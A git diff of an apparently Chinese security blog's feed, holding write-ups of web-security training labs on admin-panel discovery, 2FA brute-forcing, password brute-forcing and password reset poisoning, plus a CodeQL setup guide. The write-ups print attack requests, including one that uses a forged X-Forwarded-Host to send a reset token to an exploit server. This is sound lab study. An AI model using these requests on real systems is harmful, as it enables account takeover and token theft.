+&lt;p>&lt;img alt="Lab description" src="/img/2024/access-control-lab-unprotected-admin-functionality-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
-&lt;li>在Lab url后端新增&lt;code>robots.txt&lt;/code>，返回内容如下&lt;/li>
-&lt;/ol>
+&lt;li>在Lab url后端新增&lt;code>robots.txt&lt;/code>，返回内容如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>User-agent: *
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disallow: /administrator-panel
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>访问&lt;code>/administrator-panel&lt;/code>
-&lt;img alt="Administrator panel" src="/img/access-control-lab-unprotected-admin-functionality-2.jpg">&lt;/li>
+&lt;img alt="Administrator panel" src="/img/2024/access-control-lab-unprotected-admin-functionality-2.jpg">&lt;/li>
 &lt;li>点击&lt;code>carlos - Delete&lt;/code>即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA bypass using a brute-force attack</title><link>/posts/authentication-lab-2fa-bypass-using-a-brute-force-attack/</link><pubDate>Sat, 07 Dec 2024 17:47:40 +0800</pubDate><guid>/posts/authentication-lab-2fa-bypass-using-a-brute-force-attack/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: 2FA bypass using a brute-force attack</title><link>/posts/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack/</link><pubDate>Sat, 07 Dec 2024 17:47:40 +0800</pubDate><guid>/posts/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
-&lt;li>使用&lt;code>carlos:montoya&lt;/code>登录后，来到输入&lt;code>security code&lt;/code>页面，且输入错误2次后，会跳转回到登入页面；输入&lt;code>security code&lt;/code>对应Request如下&lt;/li>
-&lt;/ol>
+&lt;li>使用&lt;code>carlos:montoya&lt;/code>登录后，来到输入&lt;code>security code&lt;/code>页面，且输入错误2次后，会跳转回到登入页面；输入&lt;code>security code&lt;/code>对应Request如下
 &lt;pre tabindex="0">&lt;code class="language-htttp" data-lang="htttp">POST /login2 HTTP/2
 csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=1111
-&lt;/code>&lt;/pre>&lt;ol start="3">
+&lt;/code>&lt;/pre>&lt;/li>
 &lt;li>在进行爆破时，需要同时获取&lt;code>csrf&lt;/code>与&lt;code>mfa-code&lt;/code>参数&lt;/li>
 &lt;li>&lt;code>csrf&lt;/code>需要通过登录操作从服务器端获取，题目建议使用Burp macros自动化获得&lt;code>csrf&lt;/code>
 &lt;ol>
 &lt;li>点击右上角&lt;code>Settings&lt;/code>进行页面，选择左侧&lt;code>Sessions&lt;/code>，再点击中间&lt;code>Session handling rules -&amp;gt; Add&lt;/code>&lt;/li>
 &lt;li>在&lt;code>Rule actions&lt;/code>点击&lt;code>Add&lt;/code>，并选择&lt;code>Run a macro&lt;/code>
-&lt;img alt="Run a macro" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-2.jpg">&lt;/li>
+&lt;img alt="Run a macro" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-2.jpg">&lt;/li>
 &lt;li>点击&lt;code>Add&lt;/code>
-&lt;img alt="Add" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-3.jpg">&lt;/li>
+&lt;img alt="Add" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-3.jpg">&lt;/li>
 &lt;li>使用&lt;code>HTTP history filter&lt;/code>过滤此次Lab的相关url
-&lt;img alt="HTTP history filter" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-4.jpg">&lt;/li>
+&lt;img alt="HTTP history filter" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-4.jpg">&lt;/li>
 &lt;li>选择产生&lt;code>csrf&lt;/code>参数的3个相关HTTP
-&lt;img alt="Macro Editor" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-5.jpg">&lt;/li>
+&lt;img alt="Macro Editor" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-5.jpg">&lt;/li>
 &lt;li>点击&lt;code>OK&lt;/code>后回到主设定页面
-&lt;img alt="Macro Editor" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-6.jpg">&lt;/li>
+&lt;img alt="Macro Editor" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-6.jpg">&lt;/li>
 &lt;li>点击&lt;code>Scope&lt;/code>，并在&lt;code>URL scope&lt;/code>中选择&lt;code>Include all URLs&lt;/code>
-&lt;img alt="URL scope" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-7.jpg">&lt;/li>
+&lt;img alt="URL scope" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-7.jpg">&lt;/li>
 &lt;/ol>
 &lt;/li>
 &lt;li>将验证&lt;code>security code&lt;/code>HTTP发送至Burp Intruder&lt;/li>
@@ -270,31 +267,29 @@ csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=1111
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=§1111§
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="7">
 &lt;li>参数1设定如下
-&lt;img alt="Param 1" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-8.jpg">&lt;/li>
+&lt;img alt="Param 1" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-8.jpg">&lt;/li>
 &lt;li>选择&lt;code>Resource poll&lt;/code>，并点击&lt;code>Create new resource pool&lt;/code>
-&lt;img alt="Resource poll" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-9.jpg">&lt;/li>
+&lt;img alt="Resource poll" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-9.jpg">&lt;/li>
 &lt;li>点击&lt;code>Start attack&lt;/code>开始进行爆破，先查看前几个Response，内容应该包含&lt;code>Incorrect security code&lt;/code>，才表示&lt;code>csrf&lt;/code>的相关设定正确且生效&lt;/li>
 &lt;li>通过&lt;code>Intruder attack results filter&lt;/code>过滤结果
-&lt;img alt="Filter" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-10.jpg">&lt;/li>
+&lt;img alt="Filter" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-10.jpg">&lt;/li>
 &lt;li>根据爆破结果，将&lt;code>Set-Cookie&lt;/code>中的&lt;code>session&lt;/code>变量粘贴至浏览器的&lt;code>Cookie&lt;/code>
-&lt;img alt="Cookie" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-11.jpg">
-&lt;img alt="Cookie" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-12.jpg">&lt;/li>
+&lt;img alt="Cookie" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-11.jpg">
+&lt;img alt="Cookie" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-12.jpg">&lt;/li>
 &lt;li>刷新页面后即可解题
-&lt;img alt="Solved" src="/img/authentication-lab-2fa-bypass-using-a-brute-force-attack-13.jpg">&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Broken brute-force protection, multiple credentials per request</title><link>/posts/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request/</link><pubDate>Sat, 07 Dec 2024 17:22:28 +0800</pubDate><guid>/posts/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request-1.jpg">&lt;/p>
+&lt;img alt="Solved" src="/img/2024/authentication-lab-2fa-bypass-using-a-brute-force-attack-13.jpg">&lt;/li>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Broken brute-force protection, multiple credentials per request</title><link>/posts/2024/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request/</link><pubDate>Sat, 07 Dec 2024 17:22:28 +0800</pubDate><guid>/posts/2024/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-broken-brute-force-protection-multiple-credentials-per-request-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
-&lt;li>通过页面进行错误登录尝试，Response如下&lt;/li>
-&lt;/ol>
+&lt;li>通过页面进行错误登录尝试，Response如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;username&amp;#34;:&amp;#34;carlos&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;1&amp;#34;}
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
-&lt;li>将Request发送至Burp Repeater，并将&lt;code>password&lt;/code>参数替换为&lt;code>JSON array&lt;/code>格式，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
-&lt;/ol>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>将Request发送至Burp Repeater，并将&lt;code>password&lt;/code>参数替换为&lt;code>JSON array&lt;/code>格式，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /login &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{&amp;#34;username&amp;#34;:&amp;#34;carlos&amp;#34;,&amp;#34;password&amp;#34;:[
@@ -401,16 +396,16 @@ csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=1111
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]}
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">302&lt;/span> &lt;span style="color:#a6e22e">Found&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Location&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">/my-account?id=carlos&lt;/span>
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="4">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>将请求发送回浏览器即可解题&lt;/li>
-&lt;/ol></content></item><item><title>[Write Up]Lab: Password brute-force via password change</title><link>/posts/authentication-lab-password-brute-force-via-password-change/</link><pubDate>Sat, 07 Dec 2024 15:04:32 +0800</pubDate><guid>/posts/authentication-lab-password-brute-force-via-password-change/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-brute-force-via-password-change-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-brute-force-via-password-change-1.jpg">&lt;/p>
+&lt;/ol></content></item><item><title>[Write Up]Lab: Password brute-force via password change</title><link>/posts/2024/authentication-lab-password-brute-force-via-password-change/</link><pubDate>Sat, 07 Dec 2024 15:04:32 +0800</pubDate><guid>/posts/2024/authentication-lab-password-brute-force-via-password-change/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-brute-force-via-password-change-1.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-brute-force-via-password-change-1.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
 &lt;li>登录成功后，看到此&lt;code>Change password&lt;/code>按钮
-&lt;img alt="Change password" src="/img/authentication-lab-password-brute-force-via-password-change-2.jpg">&lt;/li>
+&lt;img alt="Change password" src="/img/2024/authentication-lab-password-brute-force-via-password-change-2.jpg">&lt;/li>
 &lt;li>根据不同参数条件，获得以下三种不同情况的Response
 &lt;ol>
 &lt;li>&lt;code>Current password&lt;/code>错误，但&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>相同&lt;/li>
@@ -421,21 +416,20 @@ csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=1111
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Content-Length&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
 &lt;li>&lt;code>Current password&lt;/code>错误，且&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同，返回内容包含&lt;code>Current password is incorrect&lt;/code>关键字
-&lt;img alt="Change password" src="/img/authentication-lab-password-brute-force-via-password-change-3.jpg">&lt;/li>
+&lt;img alt="Change password" src="/img/2024/authentication-lab-password-brute-force-via-password-change-3.jpg">&lt;/li>
 &lt;li>&lt;code>Current password&lt;/code>正确，但&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同，返回内容包含&lt;code>New passwords do not match&lt;/code>关键字
-&lt;img alt="Change password" src="/img/authentication-lab-password-brute-force-via-password-change-4.jpg">&lt;/li>
+&lt;img alt="Change password" src="/img/2024/authentication-lab-password-brute-force-via-password-change-4.jpg">&lt;/li>
 &lt;/ol>
 &lt;/li>
-&lt;li>结合上述2、3的情况(&lt;code>Current password&lt;/code>错误/正确、&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同)，进行密码爆破，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表&lt;/li>
-&lt;/ol>
+&lt;li>结合上述2、3的情况(&lt;code>Current password&lt;/code>错误/正确、&lt;code>New password&lt;/code>、&lt;code>Confirm new password&lt;/code>不同)，进行密码爆破，字典使用题目中&lt;code>Candidate passwords&lt;/code>所提供的列表
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /my-account/change-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=carlos&amp;amp;current-password=§password§&amp;amp;new-password-1=1&amp;amp;new-password-2=12
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>在结果中搜索&lt;code>New passwords do not match&lt;/code>关键字，获得密码为&lt;code>abc123&lt;/code>
-&lt;img alt="Change password" src="/img/authentication-lab-password-brute-force-via-password-change-5.jpg">&lt;/li>
+&lt;img alt="Change password" src="/img/2024/authentication-lab-password-brute-force-via-password-change-5.jpg">&lt;/li>
 &lt;li>使用&lt;code>carlos:abc123&lt;/code>登录即可解题&lt;/li>
-&lt;/ol></content></item><item><title>在Macos上安装CodeQL并集成VSCode插件</title><link>/posts/installing-codeql-on-macos/</link><pubDate>Thu, 05 Dec 2024 22:05:14 +0800</pubDate><guid>/posts/installing-codeql-on-macos/</guid><description>&lt;ol>
+&lt;/ol></content></item><item><title>在Macos上安装CodeQL并集成VSCode插件</title><link>/posts/2024/installing-codeql-on-macos/</link><pubDate>Thu, 05 Dec 2024 22:05:14 +0800</pubDate><guid>/posts/2024/installing-codeql-on-macos/</guid><description>&lt;ol>
 &lt;li>至&lt;a href="https://github.com/github/codeql-action/releases">codeql-action releases&lt;/a>下载最新版本的&lt;code>codeql-bundle-osx64.tar.gz&lt;/code>&lt;/li>
 &lt;li>解压缩到任一目录，执行以下命令确认可执行&lt;/li>
 &lt;/ol>
@@ -451,19 +445,19 @@ csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=1111
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> 2019-2024 GitHub, Inc.
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
 &lt;li>至VSCode 下载&lt;code>CodeQL&lt;/code>插件
-&lt;img alt="Lab description" src="/img/installing-codeql-on-macos-1.jpg">&lt;/li>
+&lt;img alt="Lab description" src="/img/2024/installing-codeql-on-macos-1.jpg">&lt;/li>
 &lt;li>在&lt;code>CodeQL&lt;/code>插件&lt;code>Manage&lt;/code>中设置&lt;code>Cli: Executable Path&lt;/code>，需要指定到步骤2的二进制位置
-&lt;img alt="Lab description" src="/img/installing-codeql-on-macos-2.jpg">&lt;/li>
+&lt;img alt="Lab description" src="/img/2024/installing-codeql-on-macos-2.jpg">&lt;/li>
 &lt;li>至&lt;code>EXPLORER&lt;/code>中开启任意目录作为CodeQL workspace&lt;/li>
 &lt;li>根据&lt;a href="https://codeql.github.com/docs/codeql-language-guides/basic-query-for-go-code/">Github Basic query for Go code&lt;/a>，尝试从Github上直接导入database&lt;/li>
 &lt;li>点击&lt;code>From Github&lt;/code>后输入&lt;code>https://github.com/go-gorm/gorm&lt;/code>进行导入
-&lt;img alt="From Github" src="/img/installing-codeql-on-macos-3.jpg">&lt;/li>
+&lt;img alt="From Github" src="/img/2024/installing-codeql-on-macos-3.jpg">&lt;/li>
 &lt;li>导入成功
-&lt;img alt="From Github" src="/img/installing-codeql-on-macos-4.jpg">&lt;/li>
+&lt;img alt="From Github" src="/img/2024/installing-codeql-on-macos-4.jpg">&lt;/li>
 &lt;li>点击&lt;code>Create one to get started&lt;/code>
-&lt;img alt="From Github" src="/img/installing-codeql-on-macos-5.jpg">&lt;/li>
+&lt;img alt="From Github" src="/img/2024/installing-codeql-on-macos-5.jpg">&lt;/li>
 &lt;li>创建成功，&lt;code>codeqlProject&lt;/code>为步骤5所开启的目录，&lt;code>codeql-custom-queries-go&lt;/code>为VSCode自动创建
-&lt;img alt="From Github" src="/img/installing-codeql-on-macos-6.jpg">&lt;/li>
+&lt;img alt="From Github" src="/img/2024/installing-codeql-on-macos-6.jpg">&lt;/li>
 &lt;li>&lt;code>example.ql&lt;/code>内容如下&lt;/li>
 &lt;/ol>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/**
@@ -480,125 +474,117 @@ csrf=tfSyxjDn9KpPz9FIj9iWu6UNWFoWDKk6&amp;amp;mfa-code=1111
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>select f, &lt;span style="color:#e6db74">&amp;#34;Hello, world!&amp;#34;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="12">
 &lt;li>点击鼠标右键选择&lt;code>CodeQL: Run Query on Selected Database&lt;/code>，扫描结果
-&lt;img alt="From Github" src="/img/installing-codeql-on-macos-7.jpg">&lt;/li>
+&lt;img alt="From Github" src="/img/2024/installing-codeql-on-macos-7.jpg">&lt;/li>
 &lt;li>尝试&lt;a href="https://github.com/github/codeql/tree/main/go/ql/src/Security">Github 其他规则集&lt;/a>&lt;/li>
 &lt;li>如果是本地代码，则执行下列命令后导入databases&lt;/li>
 &lt;/ol>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ codeql database create ./vul_codeql_database -s &amp;lt;local project path&amp;gt; --language&lt;span style="color:#f92672">=&lt;/span>go
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></content></item><item><title>[Write Up]Lab: Password reset poisoning via middleware</title><link>/posts/authentication-lab-password-reset-poisoning-via-middleware/</link><pubDate>Wed, 04 Dec 2024 22:56:33 +0800</pubDate><guid>/posts/authentication-lab-password-reset-poisoning-via-middleware/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-reset-poisoning-via-middleware-11.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
-&lt;p>&lt;img alt="Lab description" src="/img/authentication-lab-password-reset-poisoning-via-middleware-11.jpg">&lt;/p>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></content></item><item><title>[Write Up]Lab: Password reset poisoning via middleware</title><link>/posts/2024/authentication-lab-password-reset-poisoning-via-middleware/</link><pubDate>Wed, 04 Dec 2024 22:56:33 +0800</pubDate><guid>/posts/2024/authentication-lab-password-reset-poisoning-via-middleware/</guid><description>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-11.jpg">&lt;/p></description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-11.jpg">&lt;/p>
 &lt;h2 id="solution">Solution&lt;/h2>
 &lt;ol>
 &lt;li>进入Lab页面后，点击右上角&lt;code>My account&lt;/code>按钮后进入&lt;code>login&lt;/code>页面&lt;/li>
-&lt;li>首先使用&lt;code>wiener&lt;/code>点击&lt;code>Forgot password?&lt;/code>，在填写&lt;code>username&lt;/code>后点击按钮，对应Request如下&lt;/li>
-&lt;/ol>
+&lt;li>首先使用&lt;code>wiener&lt;/code>点击&lt;code>Forgot password?&lt;/code>，在填写&lt;code>username&lt;/code>后点击按钮，对应Request如下
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a5800510400298b80f5992500c700e3.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=wiener
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
 &lt;li>使用&lt;code>wiener:peter&lt;/code>登录后通过上方&lt;code>Go to exploit server -&amp;gt; Email client&lt;/code>进行Email，查看邮件
-&lt;img alt="Email" src="/img/authentication-lab-password-reset-poisoning-via-middleware-12.jpg">&lt;/li>
+&lt;img alt="Email" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-12.jpg">&lt;/li>
 &lt;li>点击链接后跳转至重置密码页面，对应请求如下
-&lt;img alt="Reset password" src="/img/authentication-lab-password-reset-poisoning-via-middleware-13.jpg">&lt;/li>
-&lt;/ol>
+&lt;img alt="Reset password" src="/img/2024/authentication-lab-password-reset-poisoning-via-middleware-13.jpg">
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password?temp-forgot-password-token=paic89ucgyrg7c90iwdlm68mq1x6rz6z &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a5800510400298b80f5992500c700e3.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>temp-forgot-password-token=paic89ucgyrg7c90iwdlm68mq1x6rz6z&amp;amp;new-password-1=1234&amp;amp;new-password-2=1234
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="5">
-&lt;li>将步骤2的Request发送到Burp Repeater，在请求中新增&lt;code>X-Forwarded-Host&lt;/code>，指向&lt;code>Go to exploit server&lt;/code>的&lt;code>URL&lt;/code>，同时将&lt;code>username&lt;/code>设置为&lt;code>carlos&lt;/code>&lt;/li>
-&lt;/ol>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>将步骤2的Request发送到Burp Repeater，在请求中新增&lt;code>X-Forwarded-Host&lt;/code>，指向&lt;code>Go to exploit server&lt;/code>的&lt;code>URL&lt;/code>，同时将&lt;code>username&lt;/code>设置为&lt;code>carlos&lt;/code>
 &lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /forgot-password &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">0a5800510400298b80f5992500c700e3.web-security-academy.net&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>X-Forwarded-Host&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">exploit-0a520006049829088059982501f70055.exploit-server.net/exploit&lt;/span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
 &lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username=carlos
